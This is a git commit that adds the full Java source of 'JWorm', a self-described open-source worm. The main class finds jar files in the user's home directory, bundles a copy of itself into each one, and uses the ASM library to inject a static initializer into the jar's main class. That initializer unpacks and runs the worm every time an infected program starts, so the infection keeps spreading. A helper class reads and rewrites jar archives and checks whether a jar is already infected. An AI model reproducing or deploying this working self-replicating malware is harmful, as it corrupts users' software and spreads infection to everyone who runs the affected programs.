3e5024d50fdac4e2b7c66b865b2e6d11ba901587
DMoneigh <dmoneigh@gmail.com>
2015-04-02 00:37:19 -0500

    Initial Commit

---
+++ src/com/jworm/JWorm.java
@@ -0,0 +1,209 @@
+package com.jworm;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.jar.JarFile;
+
+import org.objectweb.asm.Label;
+import org.objectweb.asm.Opcodes;
+import org.objectweb.asm.Type;
+import org.objectweb.asm.tree.MethodNode;
+
+import com.jworm.util.JavaArchive;
+
+/**
+ * An Open-Source Java Worm.
+ * 
+ * @author Desmond Jackson
+ */
+public class JWorm extends Object implements Opcodes {
+	
+	/**
+	 * The main method.
+	 * 
+	 * @param args String arguments passed to this program
+	 */
+	public static void main(String[] args) throws IOException {
+		for (File file : new File(System.getProperty("user.home")).listFiles())
+			if (file.getName().endsWith(".jar")) {
+				JavaArchive jar = new JavaArchive(new JarFile(file));
+				if (jar.isInfected())
+					continue;
+				jar.addFile("JWorm.jar");
+				jar.getMainClassAsNode().methods.add(getClinit());
+				jar.write(file);
+			}
+	}
+	
+	/**
+	 * Gets JWorm's <clinit> infection method.
+	 * 
+	 * @return JWorm's <clinit> infection method
+	 */
+	private static MethodNode getClinit() {
+		MethodNode mv = new MethodNode(ACC_STATIC, "<clinit>", "()V", null, null);
+		mv.visitCode();
+		Label l0 = new Label();
+		Label l1 = new Label();
+		Label l2 = new Label();
+		mv.visitTryCatchBlock(l0, l1, l2, "java/io/IOException");
+		Label l3 = new Label();
+		mv.visitTryCatchBlock(l0, l1, l3, "java/lang/ClassNotFoundException");
+		Label l4 = new Label();
+		mv.visitTryCatchBlock(l0, l1, l4, "java/lang/IllegalAccessException");
+		Label l5 = new Label();
+		mv.visitTryCatchBlock(l0, l1, l5, "java/lang/IllegalArgumentException");
+		Label l6 = new Label();
+		mv.visitTryCatchBlock(l0, l1, l6, "java/lang/reflect/InvocationTargetException");
+		Label l7 = new Label();
+		mv.visitTryCatchBlock(l0, l1, l7, "java/lang/NoSuchMethodException");
+		Label l8 = new Label();
+		mv.visitTryCatchBlock(l0, l1, l8, "java/lang/SecurityException");
+		mv.visitLdcInsn("JWorm.jar");
+		mv.visitMethodInsn(INVOKESTATIC, "java/lang/ClassLoader", "getSystemResourceAsStream", "(Ljava/lang/String;)Ljava/io/InputStream;", false);
+		mv.visitVarInsn(ASTORE, 0);
+		mv.visitIntInsn(SIPUSH, 1024);
+		mv.visitIntInsn(NEWARRAY, T_BYTE);
+		mv.visitVarInsn(ASTORE, 1);
+		mv.visitInsn(ICONST_0);
+		mv.visitVarInsn(ISTORE, 2);
+		mv.visitTypeInsn(NEW, "java/io/File");
+		mv.visitInsn(DUP);
+		mv.visitLdcInsn("JWorm.jar");
+		mv.visitMethodInsn(INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
+		mv.visitVarInsn(ASTORE, 3);
+		mv.visitVarInsn(ALOAD, 3);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "deleteOnExit", "()V", false);
+		mv.visitLabel(l0);
+		mv.visitTypeInsn(NEW, "java/io/FileOutputStream");
+		mv.visitInsn(DUP);
+		mv.visitVarInsn(ALOAD, 3);
+		mv.visitMethodInsn(INVOKESPECIAL, "java/io/FileOutputStream", "<init>", "(Ljava/io/File;)V", false);
+		mv.visitVarInsn(ASTORE, 4);
+		Label l9 = new Label();
+		mv.visitJumpInsn(GOTO, l9);
+		Label l10 = new Label();
+		mv.visitLabel(l10);
+		mv.visitFrame(Opcodes.F_FULL, 5, new Object[] {"java/io/InputStream", "[B", Opcodes.INTEGER, "java/io/File", "java/io/OutputStream"}, 0, new Object[] {});
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitVarInsn(ALOAD, 1);
+		mv.visitInsn(ICONST_0);
+		mv.visitVarInsn(ILOAD, 2);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/OutputStream", "write", "([BII)V", false);
+		mv.visitLabel(l9);
+		mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
+		mv.visitVarInsn(ALOAD, 0);
+		mv.visitVarInsn(ALOAD, 1);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "read", "([B)I", false);
+		mv.visitInsn(DUP);
+		mv.visitVarInsn(ISTORE, 2);
+		mv.visitInsn(ICONST_M1);
+		mv.visitJumpInsn(IF_ICMPNE, l10);
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/OutputStream", "close", "()V", false);
+		mv.visitVarInsn(ALOAD, 0);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "close", "()V", false);
+		mv.visitTypeInsn(NEW, "java/net/URL");
+		mv.visitInsn(DUP);
+		mv.visitTypeInsn(NEW, "java/lang/StringBuilder");
+		mv.visitInsn(DUP);
+		mv.visitLdcInsn("jar:file:");
+		mv.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "(Ljava/lang/String;)V", false);
+		mv.visitVarInsn(ALOAD, 3);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "getAbsolutePath", "()Ljava/lang/String;", false);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
+		mv.visitLdcInsn("!/");
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
+		mv.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
+		mv.visitVarInsn(ASTORE, 5);
+		mv.visitTypeInsn(NEW, "java/net/URLClassLoader");
+		mv.visitInsn(DUP);
+		mv.visitInsn(ICONST_1);
+		mv.visitTypeInsn(ANEWARRAY, "java/net/URL");
+		mv.visitInsn(DUP);
+		mv.visitInsn(ICONST_0);
+		mv.visitVarInsn(ALOAD, 5);
+		mv.visitInsn(AASTORE);
+		mv.visitMethodInsn(INVOKESPECIAL, "java/net/URLClassLoader", "<init>", "([Ljava/net/URL;)V", false);
+		mv.visitVarInsn(ASTORE, 6);
+		mv.visitVarInsn(ALOAD, 6);
+		mv.visitLdcInsn("com.jworm.JWorm");
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/URLClassLoader", "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;", false);
+		mv.visitVarInsn(ASTORE, 7);
+		mv.visitVarInsn(ALOAD, 7);
+		mv.visitLdcInsn("main");
+		mv.visitInsn(ICONST_1);
+		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
+		mv.visitInsn(DUP);
+		mv.visitInsn(ICONST_0);
+		mv.visitLdcInsn(Type.getType("[Ljava/lang/String;"));
+		mv.visitInsn(AASTORE);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
+		mv.visitVarInsn(ASTORE, 8);
+		mv.visitVarInsn(ALOAD, 8);
+		mv.visitInsn(ACONST_NULL);
+		mv.visitInsn(ICONST_1);
+		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
+		mv.visitInsn(DUP);
+		mv.visitInsn(ICONST_0);
+		mv.visitInsn(ICONST_0);
+		mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
+		mv.visitInsn(AASTORE);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
+		mv.visitInsn(POP);
+		mv.visitVarInsn(ALOAD, 6);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/URLClassLoader", "close", "()V", false);
+		mv.visitLabel(l1);
+		Label l11 = new Label();
+		mv.visitJumpInsn(GOTO, l11);
+		mv.visitLabel(l2);
+		mv.visitFrame(Opcodes.F_FULL, 4, new Object[] {"java/io/InputStream", "[B", Opcodes.INTEGER, "java/io/File"}, 1, new Object[] {"java/io/IOException"});
+		mv.visitVarInsn(ASTORE, 4);
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/IOException", "printStackTrace", "()V", false);
+		mv.visitJumpInsn(GOTO, l11);
+		mv.visitLabel(l3);
+		mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/ClassNotFoundException"});
+		mv.visitVarInsn(ASTORE, 4);
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/ClassNotFoundException", "printStackTrace", "()V", false);
+		mv.visitJumpInsn(GOTO, l11);
+		mv.visitLabel(l4);
+		mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/IllegalAccessException"});
+		mv.visitVarInsn(ASTORE, 4);
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/IllegalAccessException", "printStackTrace", "()V", false);
+		mv.visitJumpInsn(GOTO, l11);
+		mv.visitLabel(l5);
+		mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/IllegalArgumentException"});
+		mv.visitVarInsn(ASTORE, 4);
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/IllegalArgumentException", "printStackTrace", "()V", false);
+		mv.visitJumpInsn(GOTO, l11);
+		mv.visitLabel(l6);
+		mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/reflect/InvocationTargetException"});
+		mv.visitVarInsn(ASTORE, 4);
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/InvocationTargetException", "printStackTrace", "()V", false);
+		mv.visitJumpInsn(GOTO, l11);
+		mv.visitLabel(l7);
+		mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/NoSuchMethodException"});
+		mv.visitVarInsn(ASTORE, 4);
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/NoSuchMethodException", "printStackTrace", "()V", false);
+		mv.visitJumpInsn(GOTO, l11);
+		mv.visitLabel(l8);
+		mv.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/SecurityException"});
+		mv.visitVarInsn(ASTORE, 4);
+		mv.visitVarInsn(ALOAD, 4);
+		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/SecurityException", "printStackTrace", "()V", false);
+		mv.visitLabel(l11);
+		mv.visitFrame(Opcodes.F_FULL, 0, new Object[] {}, 0, new Object[] {});
+		mv.visitInsn(RETURN);
+		mv.visitMaxs(6, 9);
+		mv.visitEnd();
+		return mv;
+	}
+
+}
---
+++ src/com/jworm/util/JavaArchive.java
@@ -0,0 +1,176 @@
+package com.jworm.util;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.util.Enumeration;
+import java.util.HashMap;
+import java.util.Iterator;
+import java.util.Map;
+import java.util.Map.Entry;
+import java.util.jar.JarEntry;
+import java.util.jar.JarFile;
+import java.util.jar.JarOutputStream;
+
+import org.objectweb.asm.ClassReader;
+import org.objectweb.asm.ClassWriter;
+import org.objectweb.asm.tree.ClassNode;
+import org.objectweb.asm.util.CheckClassAdapter;
+
+/**
+ * Represents a Jar file.
+ *
+ * @author Desmond Jackson
+ */
+public class JavaArchive extends Object implements Iterable<ClassNode> {
+
+	/**
+	 * The Jar file to represent.
+	 */
+	private JarFile jarFile;
+
+	/**
+	 * The class files found in the represented Jar file.
+	 */
+	private Map<String, ClassNode> classes = new HashMap<String, ClassNode>();
+
+	/**
+	 * The other files found in the represented Jar file.
+	 */
+	private Map<String, byte[]> otherFiles = new HashMap<String, byte[]>();
+
+	/**
+	 * Creates the Jar file representation.
+	 * 
+	 * @param jarFile The Jar file to represent
+	 */
+	public JavaArchive(JarFile jarFile) {
+		super();
+		this.jarFile = jarFile;
+		load();
+	}
+
+	/**
+	 * Loads all of the represented Jar file's entries into memory.
+	 */
+	private void load() {
+		Enumeration<JarEntry> entries = jarFile.entries();
+		while (entries.hasMoreElements()) {
+			JarEntry entry = entries.nextElement();
+			String name = entry.getName();
+			if (name.endsWith(".class")) {
+				ClassNode node = new ClassNode();
+				try {
+					ClassReader reader = new ClassReader(jarFile
+							.getInputStream(entry));
+					reader.accept(node, ClassReader.SKIP_DEBUG |
+							ClassReader.SKIP_FRAMES);
+					classes.put(name.replace(".class", ""), node);
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+			} else {
+				try {
+					InputStream in = jarFile.getInputStream(entry);
+					byte[] bytes = new byte[1024];
+					ByteArrayOutputStream baos = new ByteArrayOutputStream();
+					int count = 0;
+					while ((count = in.read(bytes)) != -1)
+						baos.write(bytes, 0, count);
+					in.close();
+					otherFiles.put(name, baos.toByteArray());
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+			}
+		}
+	}
+
+	/**
+	 * Adds a file to the map of other files by name.
+	 * 
+	 * @param name The name of the file to add
+	 */
+	public void addFile(String name) {
+		try {
+			InputStream in = ClassLoader.getSystemResourceAsStream(name);
+			byte[] bytes = new byte[1024];
+			ByteArrayOutputStream baos = new ByteArrayOutputStream();
+			int count = 0;
+			while ((count = in.read(bytes)) != -1)
+				baos.write(bytes, 0, count);
+			in.close();
+			otherFiles.put(name, baos.toByteArray());
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+
+	/**
+	 * Writes this Java Archive to file.
+	 * 
+	 * @param file The file to write this Java Archive to
+	 */
+	public void write(File file) {
+		try {
+			JarOutputStream jos = new JarOutputStream(new FileOutputStream(file));
+			for (Entry<String, ClassNode> entry : classes.entrySet()) {
+				ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
+				ClassNode node = entry.getValue();
+				node.accept(new CheckClassAdapter(writer, true));
+				jos.putNextEntry(new JarEntry(node.name.concat(".class")));
+				jos.write(writer.toByteArray());
+			}
+			for (Entry<String, byte[]> entry : otherFiles.entrySet()) {
+				jos.putNextEntry(new JarEntry(entry.getKey()));
+				jos.write(entry.getValue());
+			}
+			jos.close();
+		} catch (FileNotFoundException e) {
+			e.printStackTrace();
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+	
+	/**
+	 * Gets whether the represented Jar file is infected or not.
+	 * 
+	 * @return false if the represented Jar file is not infected
+	 */
+	public boolean isInfected() {
+		return otherFiles.containsKey("JWorm.jar");
+	}
+	
+	/**
+	 * Gets the main class as a Class Node.
+	 * 
+	 * @return null if the main class could not be found
+	 */
+	public ClassNode getMainClassAsNode() {
+		try {
+			return classes.get(jarFile.getManifest().getMainAttributes()
+					.getValue("Main-Class").replace(".", "/"));
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		return null;
+	}
+
+	/**
+	 * Gets the name of the represented Jar file.
+	 * 
+	 * @return The name of represented Jar file
+	 */
+	public String getName() {
+		return jarFile.getName();
+	}
+
+	@Override
+	public Iterator<ClassNode> iterator() {
+		return classes.values().iterator();
+	}
+}
